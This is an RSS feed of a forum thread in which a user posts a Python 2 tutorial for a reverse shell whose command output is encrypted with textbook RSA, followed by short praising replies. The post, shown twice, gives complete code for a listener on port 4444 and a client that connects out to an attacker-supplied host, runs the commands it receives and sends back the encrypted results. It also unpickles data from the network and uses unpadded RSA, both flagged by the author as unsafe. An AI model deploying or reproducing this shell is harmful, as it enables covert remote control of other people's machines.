<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Reverse shell in Python with RSA encryption</title>
    <link>https://0x00sec.org/t/reverse-shell-in-python-with-rsa-encryption/1414</link>
    <description>Hello,

This is a python tutorial on programming a reverse shell with RSA encryption. I like to mention that this post is more about understanding the cryptography involved in the shell rather than the shell itself. The github link is https://github.com/ca10x/RSA-reverse-shell. 

## Listener

First we need a listener to handle all incoming connections. Here is the code of listener_rsa.py

```python
#!/usr/bin/python

from Crypto.PublicKey import RSA
from Crypto import Random
from Crypto.Hash import SHA256
import socket
from thread import *
import sys
import pickle

#Generate public key and private key

random_generator = Random.new().read
key = RSA.generate(2048, random_generator)
public_key = key.publickey()

#Create socket and bind to accept connections

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.bind((&quot;0.0.0.0&quot;, 4444))
except socket.error, v:
    print &quot;Binding failed. Error code : &quot; + str(v[0]) + &quot; Message &quot; + v[1]
    sys.exit()


print &quot;Socket bind complete&quot;

s.listen(2)
print &quot;[+] Listening to the incoming connection on port 4444...&quot;

def clientthread_sendpublickey(client) :
    client.send(pickle.dumps(public_key))

def clienthandle(client) :
    while True :
        command = raw_input(&#39;~$ &#39;)
        client.send(command)
        if command == &#39;quit&#39; :
           break
        buf = client.recv(2048)
        encreply = pickle.loads(buf)
        print key.decrypt(encreply)

while True:
    (client, (ip, port)) = s.accept()
    print &quot;Received connection from : &quot;, ip
    start_new_thread(clientthread_sendpublickey, (client,))
    print &quot;Public Key sent to&quot;, ip
    start_new_thread(clienthandle, (client,))
```

I use PyCrypto module for cryptography in Python. Go ahead and install it. I recommend pip to install the modules.

    $ sudo pip install pycrypto

Before we jump into the code let me explain you a bit about RSA encryption and it&#39;s keys. RSA is an asymmetric encryption standard. It has two keys, public and private. In simple words, public key is used to encrypt the message and private key is used to decrypt. Below is a block diagram which describes the process

  &lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/5/55cbbeca39a6914812029329b8240bdee50b0d9e.png&quot; width=&quot;329&quot; height=&quot;362&quot;&gt;

If you are interested in mathematical working of RSA, then I recommend reading http://mathworld.wolfram.com/RSAEncryption.html (Beware, for geeks only) 


In the program above, a key is generated first which is also a private key. 

```python
key = RSA.generate(2048, random_generator)
```

The function RSA.generate takes two arguments, first is the size of the key in bits and second is the random number usually generated using python random function. After the creation of private key, public key is extracted from it and stored in a variable for future use.

```python
public_key = key.publickey()
```

Sockets are created using socket module which is relatively simple. You can refer the official documentation of [Python sockets](https://docs.python.org/2/library/socket.html) for this or even a simple Google search will do. 

The socket is binded and waits for the connection incoming connection.

**Note - If you want to bind the socket in Linux to the port lesser than 1024, then you have to execute the script as root**.

When a connection is received, a new thread is initialized to send the generated public key to the client so that it can encrypt the replies. 

```python
def clientthread_sendpublickey(client) :
    client.send(pickle.dumps(public_key))
```

Why do we use pickle? Pickle is used to serialize and de-serialize the python objects. Since public_key is not a regular string, it must be pickled and then sent to the receiver.

**Warning - The pickle module is not secure against erroneous or maliciously constructed data.   Never unpickle data received from an untrusted or unauthenticated source.**

Once the public key is sent, another thread `clienthandle(client)`  is initialised to `while True :` loop which sends the command given to the receiver. The receiver runs the command and encrypts the output using public key. Then the output is pickled sent to the listener.
The reply is unpickled, decrypted using the private key and printed on the screen. 

```python
encreply = pickle.loads(buf)
print key.decrypt(encreply)
```

The connection is terminated if &#39;quit&#39; command is given.

##Reverse shell

Let&#39;s move on to the receiver&#39;s end where the reverse shell resides. The script of the reverse_shell_rsa is given below

```python
#!/usr/bin/python

import socket, subprocess, sys
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256
import pickle


RHOST = sys.argv[1]
RPORT = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

def receive_key():
   data_key = s.recv(1024)
   return data_key

pickled_publickey = receive_key()
public_key = pickle.loads(pickled_publickey)


while True :
    command = s.recv(1024)
    if command == &#39;quit&#39; :
         break
    reply = subprocess.Popen(str(command), shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdout, stderr = reply.communicate()
    en_reply = public_key.encrypt(stdout, 32)
    s.send(pickle.dumps(en_reply))

s.close()
```

As always, import the necessary modules. The IP address to connect to is given as an argument and is stored in the RHOST variable. Socket is created and the connection is made with the server (listener). As soon as the connection is accepted, the server sends the public key (Scroll up to the `clientthread_sendpublickey()` in listener.py script) which is received via function receive_key()  and depickled (remember the pickling?) to obtain the public key.

```python
def receive_key():
   data_key = s.recv(1024)
   return data_key

pickled_publickey = receive_key()
public_key = pickle.loads(pickled_publickey)
```

A `while True` loop is initialized for the persistence of the connection and command is received. If the command is &#39;quit&#39; then the show is over. Else the given command is run as a subprocess and the standard output, standard error is piped as to the variable &#39;reply&#39;. The standard output is then encrypted using the public key, pickled and sent to the server.  

```python
en_reply = public_key.encrypt(stdout, 32)
s.send(pickle.dumps(en_reply))
```
It then waits patiently until the next command.

##Important note

* This method is the implementation of &#39;textbook RSA&#39;. For the real world implementation, you have to add paddings such as PKCS1_OAEP. 

* The RSA is a lot slower and it can encrypt only 256 bytes at a time. Why you ask? Because the value of n is 2048 and 2048/8 = 256. The threshold will lower if the padding is added since it takes up couple more bytes.

The workaround is that the RSA should be used over AES.

I&#39;ll explain that concept in the next post. Since this is my first post, feedbacks are welcome and appreciated. 

Happy new year folks! 

Regards,

Cal0X</description>
    
    <lastBuildDate>Sun, 01 Jan 2017 07:18:48 +0000</lastBuildDate>
    <category>Cryptology</category>
    <atom:link href="https://0x00sec.org/t/reverse-shell-in-python-with-rsa-encryption/1414.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Reverse shell in Python with RSA encryption</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/reverse-shell-in-python-with-rsa-encryption/1414/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/reverse-shell-in-python-with-rsa-encryption/1414/5</link>
        <pubDate>Sun, 21 Jan 2018 00:41:40 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1414-5</guid>
        <source url="https://0x00sec.org/t/reverse-shell-in-python-with-rsa-encryption/1414.rss">Reverse shell in Python with RSA encryption</source>
      </item>
      <item>
        <title>Reverse shell in Python with RSA encryption</title>
        <dc:creator><![CDATA[Cal0X]]></dc:creator>
        <description><![CDATA[
            <p>Thank you. Glad you enjoyed it <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
          <p><a href="https://0x00sec.org/t/reverse-shell-in-python-with-rsa-encryption/1414/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/reverse-shell-in-python-with-rsa-encryption/1414/4</link>
        <pubDate>Sun, 01 Jan 2017 07:18:48 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1414-4</guid>
        <source url="https://0x00sec.org/t/reverse-shell-in-python-with-rsa-encryption/1414.rss">Reverse shell in Python with RSA encryption</source>
      </item>
      <item>
        <title>Reverse shell in Python with RSA encryption</title>
        <dc:creator><![CDATA[oaktree]]></dc:creator>
        <description><![CDATA[
            <p>Iâ€™m excited for when you show us an AES key exchange with RSA.</p>
          <p><a href="https://0x00sec.org/t/reverse-shell-in-python-with-rsa-encryption/1414/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/reverse-shell-in-python-with-rsa-encryption/1414/3</link>
        <pubDate>Sat, 31 Dec 2016 19:11:24 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1414-3</guid>
        <source url="https://0x00sec.org/t/reverse-shell-in-python-with-rsa-encryption/1414.rss">Reverse shell in Python with RSA encryption</source>
      </item>
      <item>
        <title>Reverse shell in Python with RSA encryption</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>SUPER DOPE!</p>
<p><a class="mention" href="https://0x00sec.org/u/cal0x">@Cal0X</a> is 1337 as.</p>
          <p><a href="https://0x00sec.org/t/reverse-shell-in-python-with-rsa-encryption/1414/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/reverse-shell-in-python-with-rsa-encryption/1414/2</link>
        <pubDate>Sat, 31 Dec 2016 19:09:46 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1414-2</guid>
        <source url="https://0x00sec.org/t/reverse-shell-in-python-with-rsa-encryption/1414.rss">Reverse shell in Python with RSA encryption</source>
      </item>
      <item>
        <title>Reverse shell in Python with RSA encryption</title>
        <dc:creator><![CDATA[Cal0X]]></dc:creator>
        <description><![CDATA[
            <p>Hello,</p>
<p>This is a python tutorial on programming a reverse shell with RSA encryption. I like to mention that this post is more about understanding the cryptography involved in the shell rather than the shell itself. The github link is <a href="https://github.com/ca10x/RSA-reverse-shell" class="inline-onebox-loading" rel="noopener nofollow ugc">https://github.com/ca10x/RSA-reverse-shell</a>.</p>
<h2>Listener</h2>
<p>First we need a listener to handle all incoming connections. Here is the code of listener_rsa.py</p>
<pre><code class="lang-python">#!/usr/bin/python

from Crypto.PublicKey import RSA
from Crypto import Random
from Crypto.Hash import SHA256
import socket
from thread import *
import sys
import pickle

#Generate public key and private key

random_generator = Random.new().read
key = RSA.generate(2048, random_generator)
public_key = key.publickey()

#Create socket and bind to accept connections

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.bind(("0.0.0.0", 4444))
except socket.error, v:
    print "Binding failed. Error code : " + str(v[0]) + " Message " + v[1]
    sys.exit()


print "Socket bind complete"

s.listen(2)
print "[+] Listening to the incoming connection on port 4444..."

def clientthread_sendpublickey(client) :
    client.send(pickle.dumps(public_key))

def clienthandle(client) :
    while True :
        command = raw_input('~$ ')
        client.send(command)
        if command == 'quit' :
           break
        buf = client.recv(2048)
        encreply = pickle.loads(buf)
        print key.decrypt(encreply)

while True:
    (client, (ip, port)) = s.accept()
    print "Received connection from : ", ip
    start_new_thread(clientthread_sendpublickey, (client,))
    print "Public Key sent to", ip
    start_new_thread(clienthandle, (client,))
</code></pre>
<p>I use PyCrypto module for cryptography in Python. Go ahead and install it. I recommend pip to install the modules.</p>
<pre><code>$ sudo pip install pycrypto
</code></pre>
<p>Before we jump into the code let me explain you a bit about RSA encryption and itâ€™s keys. RSA is an asymmetric encryption standard. It has two keys, public and private. In simple words, public key is used to encrypt the message and private key is used to decrypt. Below is a block diagram which describes the process</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/5/55cbbeca39a6914812029329b8240bdee50b0d9e.png" width="329" height="362"></p>
<p>If you are interested in mathematical working of RSA, then I recommend reading <a href="http://mathworld.wolfram.com/RSAEncryption.html" class="inline-onebox-loading" rel="noopener nofollow ugc">http://mathworld.wolfram.com/RSAEncryption.html</a> (Beware, for geeks only)</p>
<p>In the program above, a key is generated first which is also a private key.</p>
<pre><code class="lang-python">key = RSA.generate(2048, random_generator)
</code></pre>
<p>The function RSA.generate takes two arguments, first is the size of the key in bits and second is the random number usually generated using python random function. After the creation of private key, public key is extracted from it and stored in a variable for future use.</p>
<pre><code class="lang-python">public_key = key.publickey()
</code></pre>
<p>Sockets are created using socket module which is relatively simple. You can refer the official documentation of <a href="https://docs.python.org/2/library/socket.html" rel="noopener nofollow ugc">Python sockets</a> for this or even a simple Google search will do.</p>
<p>The socket is binded and waits for the connection incoming connection.</p>
<p><strong>Note - If you want to bind the socket in Linux to the port lesser than 1024, then you have to execute the script as root</strong>.</p>
<p>When a connection is received, a new thread is initialized to send the generated public key to the client so that it can encrypt the replies.</p>
<pre><code class="lang-python">def clientthread_sendpublickey(client) :
    client.send(pickle.dumps(public_key))
</code></pre>
<p>Why do we use pickle? Pickle is used to serialize and de-serialize the python objects. Since public_key is not a regular string, it must be pickled and then sent to the receiver.</p>
<p><strong>Warning - The pickle module is not secure against erroneous or maliciously constructed data.   Never unpickle data received from an untrusted or unauthenticated source.</strong></p>
<p>Once the public key is sent, another thread <code>clienthandle(client)</code>  is initialised to <code>while True :</code> loop which sends the command given to the receiver. The receiver runs the command and encrypts the output using public key. Then the output is pickled sent to the listener.<br>
The reply is unpickled, decrypted using the private key and printed on the screen.</p>
<pre><code class="lang-python">encreply = pickle.loads(buf)
print key.decrypt(encreply)
</code></pre>
<p>The connection is terminated if â€˜quitâ€™ command is given.</p>
<p>#<span class="hashtag">#Reverse</span> shell</p>
<p>Letâ€™s move on to the receiverâ€™s end where the reverse shell resides. The script of the reverse_shell_rsa is given below</p>
<pre><code class="lang-python">#!/usr/bin/python

import socket, subprocess, sys
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256
import pickle


RHOST = sys.argv[1]
RPORT = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

def receive_key():
   data_key = s.recv(1024)
   return data_key

pickled_publickey = receive_key()
public_key = pickle.loads(pickled_publickey)


while True :
    command = s.recv(1024)
    if command == 'quit' :
         break
    reply = subprocess.Popen(str(command), shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdout, stderr = reply.communicate()
    en_reply = public_key.encrypt(stdout, 32)
    s.send(pickle.dumps(en_reply))

s.close()
</code></pre>
<p>As always, import the necessary modules. The IP address to connect to is given as an argument and is stored in the RHOST variable. Socket is created and the connection is made with the server (listener). As soon as the connection is accepted, the server sends the public key (Scroll up to the <code>clientthread_sendpublickey()</code> in listener.py script) which is received via function receive_key()  and depickled (remember the pickling?) to obtain the public key.</p>
<pre><code class="lang-python">def receive_key():
   data_key = s.recv(1024)
   return data_key

pickled_publickey = receive_key()
public_key = pickle.loads(pickled_publickey)
</code></pre>
<p>A <code>while True</code> loop is initialized for the persistence of the connection and command is received. If the command is â€˜quitâ€™ then the show is over. Else the given command is run as a subprocess and the standard output, standard error is piped as to the variable â€˜replyâ€™. The standard output is then encrypted using the public key, pickled and sent to the server.</p>
<pre><code class="lang-python">en_reply = public_key.encrypt(stdout, 32)
s.send(pickle.dumps(en_reply))
</code></pre>
<p>It then waits patiently until the next command.</p>
<p>#<span class="hashtag">#Important</span> note</p>
<ul>
<li>
<p>This method is the implementation of â€˜textbook RSAâ€™. For the real world implementation, you have to add paddings such as PKCS1_OAEP.</p>
</li>
<li>
<p>The RSA is a lot slower and it can encrypt only 256 bytes at a time. Why you ask? Because the value of n is 2048 and 2048/8 = 256. The threshold will lower if the padding is added since it takes up couple more bytes.</p>
</li>
</ul>
<p>The workaround is that the RSA should be used over AES.</p>
<p>Iâ€™ll explain that concept in the next post. Since this is my first post, feedbacks are welcome and appreciated.</p>
<p>Happy new year folks!</p>
<p>Regards,</p>
<p>Cal0X</p>
          <p><a href="https://0x00sec.org/t/reverse-shell-in-python-with-rsa-encryption/1414/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/reverse-shell-in-python-with-rsa-encryption/1414/1</link>
        <pubDate>Sat, 31 Dec 2016 16:06:06 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1414-1</guid>
        <source url="https://0x00sec.org/t/reverse-shell-in-python-with-rsa-encryption/1414.rss">Reverse shell in Python with RSA encryption</source>
      </item>
  </channel>
</rss>
